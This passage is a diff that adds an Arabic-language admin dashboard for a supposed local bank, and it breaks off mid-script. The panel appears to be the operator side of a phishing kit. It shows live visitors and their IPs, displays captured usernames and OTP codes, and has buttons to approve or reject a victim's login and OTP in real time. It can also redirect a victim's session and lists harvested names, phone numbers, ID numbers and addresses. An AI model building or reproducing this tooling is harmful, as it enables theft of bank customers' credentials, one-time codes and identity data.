@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة الإدارة - بنك المارية المحلي</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: #fff; min-height: 100vh; }
+
+.sidebar {
+  position: fixed; top: 0; right: 0; width: 260px; height: 100vh;
+  background: linear-gradient(180deg, #0a1628 0%, #132238 100%);
+  border-left: 1px solid rgba(255,255,255,0.08);
+  padding: 30px 20px; z-index: 10; overflow-y: auto;
+}
+.sidebar-logo { text-align: center; margin-bottom: 40px; padding-bottom: 25px; border-bottom: 1px solid rgba(255,255,255,0.1); }
+.sidebar-logo h2 { font-size: 1.1rem; color: #00c8ff; margin-top: 8px; }
+.sidebar-logo span { font-size: 0.75rem; color: #6b7f9e; }
+.sidebar-nav a {
+  display: flex; align-items: center; gap: 12px; padding: 14px 18px;
+  color: #8a9bb5; text-decoration: none; border-radius: 12px; margin-bottom: 6px;
+  font-size: 0.95rem; font-weight: 500; cursor: pointer;
+}
+.sidebar-nav a:hover, .sidebar-nav a.active { background: rgba(0,200,255,0.1); color: #00c8ff; }
+.sidebar-nav a svg { width: 20px; height: 20px; flex-shrink: 0; }
+
+.main { margin-right: 260px; padding: 30px 35px; min-height: 100vh; }
+
+.top-bar {
+  display: flex; justify-content: space-between; align-items: center;
+  margin-bottom: 35px; padding-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.06);
+}
+.top-bar h1 { font-size: 1.6rem; font-weight: 700; }
+.top-bar .date { color: #6b7f9e; font-size: 0.9rem; }
+
+.stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; margin-bottom: 35px; }
+
+.stat-card {
+  background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
+  border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
+  padding: 24px 20px; position: relative; overflow: hidden;
+}
+.stat-card::after {
+  content: ''; position: absolute; top: -30px; left: -30px;
+  width: 100px; height: 100px; border-radius: 50%;
+  background: rgba(0,200,255,0.05);
+}
+.stat-card .stat-icon {
+  width: 48px; height: 48px; border-radius: 14px; display: flex;
+  align-items: center; justify-content: center; margin-bottom: 14px;
+}
+.stat-card .stat-icon svg { width: 24px; height: 24px; }
+.stat-card .stat-label { font-size: 0.82rem; color: #6b7f9e; margin-bottom: 6px; font-weight: 500; }
+.stat-card .stat-value { font-size: 2rem; font-weight: 800; letter-spacing: -1px; }
+.stat-card .stat-change { font-size: 0.78rem; margin-top: 6px; display: flex; align-items: center; gap: 4px; }
+.stat-change.up { color: #34d399; }
+
+.stat-card.active-visitors .stat-icon { background: rgba(0,200,255,0.15); }
+.stat-card.active-visitors .stat-value { color: #00c8ff; }
+.stat-card.active-visitors { border: 1px solid rgba(0,200,255,0.2); }
+.stat-card.total-visits .stat-icon { background: rgba(139,92,246,0.15); }
+.stat-card.total-visits .stat-value { color: #a78bfa; }
+.stat-card.orders .stat-icon { background: rgba(52,211,153,0.15); }
+.stat-card.orders .stat-value { color: #34d399; }
+.stat-card.pages .stat-icon { background: rgba(251,191,36,0.15); }
+.stat-card.pages .stat-value { color: #fbbf24; }
+
+.wifi-pulse { display: inline-flex; align-items: center; gap: 10px; }
+.pulse-dot {
+  width: 10px; height: 10px; background: #00c8ff; border-radius: 50%;
+  animation: pulse 1.5s ease-in-out infinite; display: inline-block;
+}
+@keyframes pulse {
+  0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,200,255,0.4); }
+  50% { opacity: 0.7; box-shadow: 0 0 0 10px rgba(0,200,255,0); }
+}
+
+.section-title { font-size: 1.15rem; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+.section-title .badge { background: rgba(0,200,255,0.15); color: #00c8ff; font-size: 0.75rem; padding: 4px 10px; border-radius: 20px; font-weight: 600; }
+
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+.orders-table {
+  width: 100%; background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
+  border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
+  overflow: hidden; margin-bottom: 30px;
+}
+.orders-table table { width: 100%; border-collapse: collapse; }
+.orders-table th {
+  text-align: right; padding: 16px 14px; font-size: 0.78rem; color: #6b7f9e;
+  font-weight: 600; background: rgba(0,0,0,0.15); border-bottom: 1px solid rgba(255,255,255,0.06);
+}
+.orders-table td { padding: 13px 14px; font-size: 0.88rem; border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: middle; }
+.orders-table td:last-child { min-width: 280px; }
+.orders-table tr:last-child td { border-bottom: none; }
+.orders-table tr:hover td { background: rgba(0,200,255,0.03); }
+
+.status-badge { padding: 4px 12px; border-radius: 20px; font-size: 0.78rem; font-weight: 600; display: inline-block; }
+.status-badge.pending { background: rgba(251,191,36,0.15); color: #fbbf24; }
+.status-badge.approved { background: rgba(52,211,153,0.15); color: #34d399; }
+.status-badge.rejected { background: rgba(248,113,113,0.15); color: #f87171; }
+.status-badge.blocked { background: rgba(156,163,175,0.2); color: #9ca3af; }
+.status-badge.click { background: rgba(0,200,255,0.15); color: #00c8ff; }
+.status-badge.waiting { background: rgba(251,146,60,0.15); color: #fb923c; animation: pulse-wait 2s ease-in-out infinite; }
+@keyframes pulse-wait { 0%,100%{opacity:1} 50%{opacity:0.6} }
+
+.btn-sm {
+  padding: 6px 14px; border-radius: 8px; border: none; font-size: 0.8rem;
+  font-weight: 600; cursor: pointer; font-family: inherit; display: inline-flex;
+  align-items: center; gap: 5px; margin: 2px;
+}
+.btn-details { background: rgba(0,200,255,0.15); color: #00c8ff; }
+.btn-details:hover { background: rgba(0,200,255,0.25); }
+.btn-redirect { background: rgba(139,92,246,0.15); color: #a78bfa; }
+.btn-redirect:hover { background: rgba(139,92,246,0.25); }
+
+.modal-overlay {
+  display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+  z-index: 100; justify-content: center; align-items: center; padding: 20px;
+}
+.modal-overlay.show { display: flex; }
+.modal {
+  background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
+  border: 1px solid rgba(255,255,255,0.1); border-radius: 24px;
+  width: 100%; max-width: 580px; max-height: 90vh; overflow-y: auto;
+  padding: 30px; position: relative;
+}
+.modal-close {
+  position: absolute; top: 18px; left: 18px; background: rgba(255,255,255,0.1);
+  border: none; color: #fff; width: 36px; height: 36px; border-radius: 10px;
+  font-size: 1.2rem; cursor: pointer; display: flex; align-items: center; justify-content: center;
+}
+.modal-close:hover { background: rgba(248,113,113,0.3); }
+.modal-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 25px; color: #00c8ff; }
+
+.modal-data { margin-bottom: 25px; }
+.modal-row {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 12px 0; border-bottom: 1px solid rgba(255,255,255,0.06);
+}
+.modal-row:last-child { border-bottom: none; }
+.modal-row .label { color: #6b7f9e; font-size: 0.88rem; font-weight: 500; }
+.modal-row .value { font-size: 0.95rem; font-weight: 600; }
+
+.modal-actions { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
+.btn-action {
+  flex: 1; min-width: 120px; padding: 14px; border-radius: 14px; border: none;
+  font-size: 0.95rem; font-weight: 700; cursor: pointer; font-family: inherit;
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+}
+.btn-approve { background: linear-gradient(135deg, #059669, #34d399); color: #fff; }
+.btn-approve:hover { opacity: 0.9; }
+.btn-reject { background: linear-gradient(135deg, #dc2626, #f87171); color: #fff; }
+.btn-reject:hover { opacity: 0.9; }
+.btn-block { background: rgba(156,163,175,0.2); color: #f87171; border: 1px solid rgba(248,113,113,0.3); }
+.btn-block:hover { background: rgba(248,113,113,0.2); }
+
+.redirect-pages-list { list-style: none; padding: 0; margin: 0; }
+.redirect-page-item {
+  display: flex; align-items: center; gap: 14px; padding: 14px 18px;
+  border: 1px solid rgba(255,255,255,0.06); border-radius: 14px;
+  margin-bottom: 10px; cursor: pointer; transition: all 0.2s;
+}
+.redirect-page-item:hover { background: rgba(0,200,255,0.1); border-color: rgba(0,200,255,0.3); }
+.redirect-page-item .rp-icon {
+  width: 42px; height: 42px; border-radius: 12px; display: flex;
+  align-items: center; justify-content: center; flex-shrink: 0;
+}
+.redirect-page-item .rp-icon.ar { background: rgba(52,211,153,0.15); }
+.redirect-page-item .rp-icon.en { background: rgba(0,200,255,0.15); }
+.redirect-page-item .rp-icon svg { width: 20px; height: 20px; }
+.redirect-page-item .rp-info { flex: 1; }
+.redirect-page-item .rp-name { font-size: 0.95rem; font-weight: 600; color: #fff; margin-bottom: 2px; }
+.redirect-page-item .rp-url { font-size: 0.78rem; color: #6b7f9e; direction: ltr; font-family: monospace; }
+.btn-session-redirect {
+  background: rgba(139,92,246,0.15); color: #a78bfa;
+  border: 1px solid rgba(139,92,246,0.2); width: 100%;
+  padding: 10px; border-radius: 12px; font-size: 0.85rem; font-weight: 600;
+  cursor: pointer; font-family: inherit; display: flex; align-items: center;
+  justify-content: center; gap: 6px; margin-top: 0;
+}
+.btn-session-redirect:hover { background: rgba(139,92,246,0.25); }
+.redirect-section-title { font-size: 0.85rem; color: #6b7f9e; font-weight: 600; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid rgba(255,255,255,0.06); }
+
+.visitors-table {
+  width: 100%; background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
+  border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
+  overflow: hidden; margin-bottom: 30px;
+}
+.visitors-table table { width: 100%; border-collapse: collapse; }
+.visitors-table th {
+  text-align: right; padding: 16px 20px; font-size: 0.8rem; color: #6b7f9e;
+  font-weight: 600; background: rgba(0,0,0,0.15); border-bottom: 1px solid rgba(255,255,255,0.06);
+}
+.visitors-table td { padding: 14px 20px; font-size: 0.9rem; border-bottom: 1px solid rgba(255,255,255,0.04); }
+.visitors-table tr:last-child td { border-bottom: none; }
+.visitors-table tr:hover td { background: rgba(0,200,255,0.03); }
+.status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-left: 8px; }
+.status-dot.online { background: #34d399; box-shadow: 0 0 6px rgba(52,211,153,0.5); }
+.page-badge { background: rgba(0,200,255,0.1); color: #00c8ff; padding: 4px 12px; border-radius: 8px; font-size: 0.8rem; }
+
+.empty-msg { text-align: center; color: #6b7f9e; padding: 50px 20px; font-size: 0.95rem; }
+
+.notif-toast {
+  position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+  background: linear-gradient(135deg, #059669, #34d399); color: #fff;
+  padding: 14px 28px; border-radius: 16px; font-weight: 700; font-size: 1rem;
+  z-index: 9999; display: none; align-items: center; gap: 10px;
+  box-shadow: 0 8px 32px rgba(52,211,153,0.4); animation: slideDown 0.4s ease;
+  cursor: pointer;
+}
+.notif-toast.show { display: flex; }
+.notif-toast .notif-icon { font-size: 1.3rem; }
+@keyframes slideDown {
+  from { transform: translateX(-50%) translateY(-80px); opacity: 0; }
+  to { transform: translateX(-50%) translateY(0); opacity: 1; }
+}
+@keyframes flashBorder {
+  0%, 100% { border-color: rgba(52,211,153,0.8); box-shadow: 0 0 15px rgba(52,211,153,0.3); }
+  50% { border-color: rgba(251,146,60,0.8); box-shadow: 0 0 15px rgba(251,146,60,0.3); }
+}
+.session-card.new-data { animation: flashBorder 1s ease-in-out 3; }
+
+.sessions-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 20px; }
+.session-card {
+  background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
+  border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
+  padding: 0; overflow: hidden; position: relative;
+}
+.session-card.has-pending { border: 1px solid rgba(251,146,60,0.4); }
+.session-card-header {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 16px 20px; background: rgba(0,0,0,0.15);
+  border-bottom: 1px solid rgba(255,255,255,0.06);
+}
+.session-card-header .session-id { font-size: 0.85rem; color: #6b7f9e; font-weight: 600; }
+.session-card-header .session-time { font-size: 0.78rem; color: #4a5f7e; }
+.session-card-body { padding: 18px 20px; }
+.session-field { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.04); }
+.session-field:last-child { border-bottom: none; }
+.session-field .sf-label { font-size: 0.82rem; color: #6b7f9e; font-weight: 500; }
+.session-field .sf-value { font-size: 0.9rem; font-weight: 600; color: #fff; }
+.session-field .sf-value.mono { font-family: monospace; direction: ltr; }
+.session-field .sf-value.otp-code { font-family: monospace; font-size: 1.2rem; letter-spacing: 4px; font-weight: 800; color: #00c8ff; direction: ltr; }
+.session-step {
+  display: flex; align-items: center; gap: 8px; padding: 12px 20px;
+  background: rgba(0,0,0,0.1); border-top: 1px solid rgba(255,255,255,0.04);
+  font-size: 0.82rem; color: #6b7f9e;
+}
+.step-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+.step-dot.done { background: #34d399; }
+.step-dot.active { background: #fb923c; animation: pulse-wait 2s ease-in-out infinite; }
+.step-dot.wait { background: #4a5f7e; }
+.step-line { width: 20px; height: 2px; background: rgba(255,255,255,0.1); }
+.session-card-actions {
+  display: flex; gap: 10px; padding: 16px 20px;
+  border-top: 1px solid rgba(255,255,255,0.06);
+}
+.session-card-actions .btn-action { flex: 1; padding: 12px; font-size: 0.9rem; border-radius: 12px; }
+
+@media (max-width: 1100px) {
+  .orders-table { overflow-x: auto; }
+  .orders-table table { min-width: 700px; }
+}
+@media (max-width: 900px) {
+  .sidebar { display: none; }
+  .main { margin-right: 0; padding: 20px 16px; }
+  .stats-grid { grid-template-columns: 1fr 1fr; }
+}
+@media (max-width: 500px) {
+  .stats-grid { grid-template-columns: 1fr; }
+  .modal { padding: 20px; }
+  .modal-actions { flex-direction: column; }
+  .btn-action { min-width: 100%; }
+  .sessions-grid { grid-template-columns: 1fr; }
+  .session-card-actions { flex-direction: column; }
+  .session-card-actions .btn-action { min-width: 100%; }
+}
+</style>
+</head>
+<body>
+
+<div class="notif-toast" id="notifToast" onclick="this.classList.remove('show')">
+  <span class="notif-icon">🔔</span>
+  <span id="notifText">بيانات جديدة!</span>
+</div>
+
+<aside class="sidebar">
+  <div class="sidebar-logo">
+    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+      <rect width="40" height="40" rx="10" fill="#00c8ff" fill-opacity="0.15"/>
+      <path d="M12 25L20 15L28 25" stroke="#00c8ff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+      <path d="M16 22L20 18L24 22" stroke="#00c8ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    <h2>بنك المارية المحلي</h2>
+    <span>لوحة الإدارة</span>
+  </div>
+  <nav class="sidebar-nav">
+    <a onclick="showTab('dashboard')" class="active" id="nav-dashboard">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+      لوحة التحكم
+    </a>
+    <a onclick="showTab('orders')" id="nav-orders">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>
+      الطلبات
+    </a>
+    <a onclick="showTab('visitors')" id="nav-visitors">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+      الزوار
+    </a>
+    <a onclick="showTab('sessions')" id="nav-sessions">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      الجلسات
+    </a>
+  </nav>
+</aside>
+
+<div class="modal-overlay" id="detailsModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal()">&times;</button>
+    <h2 class="modal-title" id="modalTitle">تفاصيل الطلب</h2>
+    <div class="modal-data" id="modalData"></div>
+    <div class="modal-actions" id="modalActions"></div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="redirectModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeRedirectModal()">&times;</button>
+    <h2 class="modal-title">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2" style="vertical-align:middle;margin-left:8px;"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      إعادة توجيه المستخدم
+    </h2>
+    <div class="redirect-section-title" id="redirectTarget"></div>
+    <ul class="redirect-pages-list" id="redirectPagesList"></ul>
+  </div>
+</div>
+
+<div class="main">
+  <div class="top-bar">
+    <h1 id="pageTitle">لوحة التحكم</h1>
+    <div class="date" id="currentDate"></div>
+  </div>
+
+  <!-- Dashboard Tab -->
+  <div class="tab-content active" id="tab-dashboard">
+    <div class="stats-grid">
+      <div class="stat-card active-visitors">
+        <div class="stat-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#00c8ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/>
+            <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="#00c8ff"/>
+          </svg>
+        </div>
+        <div class="stat-label"><span class="wifi-pulse"><span class="pulse-dot"></span> الزوار النشطون</span></div>
+        <div class="stat-value" id="activeCount">0</div>
+        <div class="stat-change up">مباشر</div>
+      </div>
+      <div class="stat-card total-visits">
+        <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></div>
+        <div class="stat-label">إجمالي الزيارات اليوم</div>
+        <div class="stat-value" id="totalVisits">0</div>
+      </div>
+      <div class="stat-card orders">
+        <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg></div>
+        <div class="stat-label">إجمالي الطلبات</div>
+        <div class="stat-value" id="totalOrders">0</div>
+      </div>
+      <div class="stat-card pages">
+        <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14,2 14,8 20,8"/></svg></div>
+        <div class="stat-label">الصفحات المعروضة</div>
+        <div class="stat-value" id="pageViews">0</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Orders Tab -->
+  <div class="tab-content" id="tab-orders">
+    <div style="display:inline-flex;align-items:center;gap:10px;background:rgba(0,200,255,0.1);border:1px solid rgba(0,200,255,0.2);border-radius:12px;padding:8px 16px;margin-bottom:20px;">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00c8ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/>
+        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="#00c8ff"/>
+      </svg>
+      <span class="pulse-dot"></span>
+      <span style="color:#00c8ff;font-weight:700;font-size:1.1rem;" id="activeCountOrders">0</span>
+      <span style="color:#6b7f9e;font-size:0.82rem;">زائر نشط</span>
+    </div>
+    <div class="section-title">قائمة الطلبات <span class="badge" id="ordersBadge">0 طلب</span></div>
+    <div class="orders-table">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>الدولة</th>
+            <th>نوع الخدمة</th>
+            <th>الاسم</th>
+            <th>رقم الجوال</th>
+            <th>الحالة</th>
+            <th>الإجراءات</th>
+          </tr>
+        </thead>
+        <tbody id="ordersBody">
+          <tr><td colspan="7" class="empty-msg">لا توجد طلبات حتى الآن</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Visitors Tab -->
+  <div class="tab-content" id="tab-visitors">
+    <div class="section-title">الزوار المتصلون حالياً <span class="badge" id="onlineBadge">0 متصل</span></div>
+    <div class="visitors-table">
+      <table>
+        <thead><tr><th>الحالة</th><th>IP</th><th>الصفحة الحالية</th><th>الجهاز</th></tr></thead>
+        <tbody id="visitorsBody">
+          <tr><td colspan="4" class="empty-msg">لا يوجد زوار نشطون</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Sessions Tab -->
+  <div class="tab-content" id="tab-sessions">
+    <div class="section-title">جلسات المستخدمين <span class="badge" id="sessionsBadge">0</span></div>
+    <div id="sessionsContainer" class="sessions-grid">
+      <div class="empty-msg">لا توجد جلسات</div>
+    </div>
+  </div>
+</div>
+
+<script>
+var ordersData = [];
+var currentOrderId = -1;
+
+function showTab(tab) {
+  document.querySelectorAll('.tab-content').forEach(function(t) { t.classList.remove('active'); });
+  document.querySelectorAll('.sidebar-nav a').forEach(function(a) { a.classList.remove('active'); });
+  document.getElementById('tab-' + tab).classList.add('active');
+  document.getElementById('nav-' + tab).classList.add('active');
+  var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار', sessions: 'الجلسات' };
+  document.getElementById('pageTitle').textContent = titles[tab];
+  if (tab === 'orders') loadOrders();
+  if (tab === 'visitors') loadVisitors();
+  if (tab === 'sessions') loadSessions();
+}
+
+var adminToken = '';
+try { adminToken = localStorage.getItem('admin_token') || ''; } catch(e) {}
+
+function authHeaders() {
+  return { 'X-Admin-Token': adminToken };
+}
+
+function checkAuth(r) {
+  if (r.status === 401) {
+    try { localStorage.removeItem('admin_token'); } catch(e) {}
+    document.cookie = 'admin_token=;path=/;expires=Thu, 01 Jan 1970 00:00:00 GMT';
+    window.location.href = '/admin/';
+    return null;
+  }
+  return r.json();
+}
+
+function loadStats() {
+  fetch('/api/stats').then(function(r) { return r.json(); }).then(function(d) {
+    document.getElementById('activeCount').textContent = d.activeVisitors;
+    document.getElementById('activeCountOrders').textContent = d.activeVisitors;
+    document.getElementById('totalVisits').textContent = d.totalVisitsToday;
+    document.getElementById('totalOrders').textContent = d.totalOrders;
+    document.getElementById('pageViews').textContent = d.pageViewsToday;
+    document.getElementById('onlineBadge').textContent = d.activeVisitors + ' متصل';
+  }).catch(function() {});
+}
+
+function loadOrders() {
+  Promise.all([
+    fetch('/api/orders', { headers: authHeaders() }).then(checkAuth),
+    fetch('/api/sessions', { headers: authHeaders() }).then(checkAuth)
+  ]).then(function(results) {
+    if (results[0]) { ordersData = results[0].orders || []; checkNewOrders(ordersData); }
+    if (results[1]) { sessionsData = results[1].sessions || []; checkNewSessions(sessionsData); }
+    renderOrders();
+  }).catch(function() {});
+}
+
+function loadVisitors() {
+  fetch('/api/visitors', { headers: authHeaders() }).then(checkAuth).then(function(d) {
+    if (!d) return;
+    var vb = document.getElementById('visitorsBody');
+    var list = d.visitors || [];
+    document.getElementById('onlineBadge').textContent = list.length + ' متصل';
+    if (list.length === 0) {
+      vb.innerHTML = '<tr><td colspan="4" class="empty-msg">لا يوجد زوار نشطون</td></tr>';
+      return;
+    }
+    vb.innerHTML = '';
+    list.forEach(function(v) {
+      var device = 'غير معروف';
+      var ua = v.ua || '';
+      if (ua.indexOf('iPhone') > -1) device = 'iPhone';
+      else if (ua.indexOf('Android') > -1) device = 'Android';
+      else if (ua.indexOf('iPad') > -1) device = 'iPad';
+      else if (ua.indexOf('Windows') > -1) device = 'Desktop';
+      else if (ua.indexOf('Mac') > -1) device = 'Mac';
+      var tr = document.createElement('tr');
+      tr.innerHTML = '<td><span class="status-dot online"></span> متصل</td><td dir="ltr" style="text-align:right">' + v.ip + '</td><td><span class="page-badge">' + v.page + '</span></td><td>' + device + '</td>';
+      vb.appendChild(tr);
+    });
+  }).catch(function() {});
+}
+
+function renderOrders() {
+  var tb = document.getElementById('ordersBody');
+  var linkedOrderIds = {};
+  sessionsData.forEach(function(s) {
+    if (s.orderId) linkedOrderIds[s.orderId] = true;
+  });
+
+  var sessionIPs = {};
+  sessionsData.forEach(function(s) {
+    if (s.ip) sessionIPs[s.ip] = true;
+  });
+
+  var allItems = [];
+  ordersData.forEach(function(o) {
+    if (linkedOrderIds[o.id]) return;
+    if (o.status === 'click') return;
+    if (o.ip && sessionIPs[o.ip]) return;
+    allItems.push({ type: 'order', data: o, date: o.date });
+  });
+  sessionsData.forEach(function(s) {
+    allItems.push({ type: 'session', data: s, date: s.date });
+  });
+  allItems.sort(function(a, b) { return new Date(b.date) - new Date(a.date); });
+
+  document.getElementById('ordersBadge').textContent = allItems.length + ' سجل';
+  if (allItems.length === 0) {
+    tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد بيانات حتى الآن</td></tr>';
+    return;
+  }
+  tb.innerHTML = '';
+  allItems.forEach(function(item) {
+    var tr = document.createElement('tr');
+    if (item.type === 'session') {
+      var s = item.data;
+      var sc, st;
+      if (s.otpStatus === 'approved') { sc = 'approved'; st = 'مكتمل'; }
+      else if (s.loginStatus === 'rejected') { sc = 'rejected'; st = 'مرفوض'; }
+      else if (s.otpStatus === 'rejected') { sc = 'rejected'; st = 'OTP مرفوض'; }
+      else if (s.otpStatus === 'waiting') { sc = 'waiting'; st = 'OTP'; }
+      else if (s.loginStatus === 'approved' && !s.otp) { sc = 'approved'; st = 'بانتظار OTP'; }
+      else if (s.loginStatus === 'waiting') { sc = 'waiting'; st = 'تسجيل دخول'; }
+      else { sc = 'pending'; st = 'بيانات جديدة'; }
+      var actBtns = '<button class="btn-sm btn-details" onclick="openSessionDetails(' + s.id + ')">التفاصيل</button>' +
+        '<button class="btn-sm btn-redirect" onclick="redirectSession(' + s.id + ')">إعادة التوجيه</button>';
+      if (s.pendingAction) {
+        var aType = s.pendingAction.type;
+        var aLabel = aType === 'login' ? 'قبول' : 'قبول OTP';
+        var rLabel = aType === 'login' ? 'رفض' : 'رفض OTP';
+        actBtns += '<button class="btn-sm" style="background:rgba(52,211,153,0.15);color:#34d399;" onclick="sessionAction(\'' + aType + '\',' + s.id + ',\'approved\')">' + aLabel + '</button>' +
+          '<button class="btn-sm" style="background:rgba(248,113,113,0.15);color:#f87171;" onclick="sessionAction(\'' + aType + '\',' + s.id + ',\'rejected\')">' + rLabel + '</button>';
+      } else {
+        actBtns += '<button class="btn-sm" disabled style="background:rgba(255,255,255,0.06);color:#555;cursor:not-allowed;opacity:0.5;">قبول</button>' +
+          '<button class="btn-sm" disabled style="background:rgba(255,255,255,0.06);color:#555;cursor:not-allowed;opacity:0.5;">رفض</button>';
+      }
+      tr.innerHTML = '<td>' + s.id + '</td><td>' + (s.country || '-') + '</td><td>' + (s.service || '-') + '</td><td>' + (s.username || '-') + '</td><td dir="ltr" style="text-align:right">' + (s.orderPhone || s.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td>' + actBtns + '</td>';
+    } else {
+      var o = item.data;
+      var sc, st;
+      if (o.status === 'approved') { sc = 'approved'; st = 'مقبول'; }
+      else if (o.status === 'rejected') { sc = 'rejected'; st = 'مرفوض'; }
+      else if (o.status === 'blocked') { sc = 'blocked'; st = 'محظور'; }
+      else if (o.status === 'click') { sc = 'pending'; st = 'طلب جديد'; }
+      else { sc = 'pending'; st = 'بيانات جديدة'; }
+      tr.innerHTML = '<td>T' + o.id + '</td><td>' + (o.country || '-') + '</td><td>' + (o.service || '-') + '</td><td>' + (o.name || '-') + '</td><td dir="ltr" style="text-align:right">' + (o.phone || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td><button class="btn-sm btn-details" onclick="openDetails(' + o.id + ')">التفاصيل</button></td>';
+    }
+    tb.appendChild(tr);
+  });
+}
+
+function openDetails(id) {
+  currentOrderId = id;
+  currentSessionId = -1;
+  var o = ordersData.find(function(x) { return x.id === id; });
+  if (!o) return;
+  var dt = o.date ? new Date(o.date).toLocaleString('ar-AE') : '-';
+  var sc = o.status === 'approved' ? 'approved' : o.status === 'rejected' ? 'rejected' : o.status === 'blocked' ? 'blocked' : o.status === 'click' ? 'click' : 'pending';
+  var st = o.status === 'approved' ? 'مقبول' : o.status === 'rejected' ? 'مرفوض' : o.status === 'blocked' ? 'محظور' : o.status === 'click' ? 'نقرة جديدة' : 'قيد المراجعة';
+  var fields = [
+    ['رقم الطلب', o.id], ['التاريخ', dt], ['الاسم الكامل', o.name],
+    ['رقم الجوال', o.phone], ['البريد الإلكتروني', o.email || '-'], ['رقم الهوية', o.id_number || '-'],
+    ['الدولة', o.country || '-'], ['الإمارة', o.emirate || '-'], ['عنوان التوصيل', o.address || '-'],
+    ['نوع الخدمة', o.service || '-'], ['عنوان IP', o.ip || '-'],
